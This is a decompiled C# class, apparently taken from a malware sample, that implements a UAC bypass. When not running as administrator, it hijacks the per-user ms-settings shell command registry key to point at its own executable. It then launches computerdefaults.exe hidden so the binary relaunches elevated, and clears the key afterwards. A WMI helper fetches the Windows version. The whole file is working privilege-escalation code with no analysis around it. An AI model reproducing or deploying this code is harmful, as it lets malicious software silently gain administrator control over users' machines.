using System;
using System.Diagnostics;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using Microsoft.Win32;

public class GClass2
{
	public static void smethod_0()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			smethod_1("Classes");
			smethod_1("Classes\\ms-settings");
			smethod_1("Classes\\ms-settings\\shell");
			smethod_1("Classes\\ms-settings\\shell\\open");
			RegistryKey registryKey = smethod_1("Classes\\ms-settings\\shell\\open\\command");
			string location = Assembly.GetExecutingAssembly().Location;
			registryKey.SetValue("", location, RegistryValueKind.String);
			registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
			registryKey.Close();
			try
			{
				Process.Start(new ProcessStartInfo
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					FileName = "cmd.exe",
					Arguments = "/c start computerdefaults.exe"
				});
			}
			catch
			{
			}
			Process.GetCurrentProcess().Kill();
		}
		else
		{
			smethod_1("Classes\\ms-settings\\shell\\open\\command").SetValue("", "", RegistryValueKind.String);
		}
	}

	public static RegistryKey smethod_1(string x)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, writable: true);
		if (!smethod_2(registryKey))
		{
			registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
		}
		return registryKey;
	}

	public static bool smethod_2(RegistryKey k)
	{
		return k != null;
	}

	private static ManagementObject smethod_3(string className)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(className);
		try
		{
			ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (val2 != null)
					{
						return val2;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return null;
	}

	public static string smethod_4()
	{
		try
		{
			ManagementObject val = smethod_3("Win32_OperatingSystem");
			if (val == null)
			{
				return string.Empty;
			}
			return ((ManagementBaseObject)val).get_Item("Version") as string;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}
}
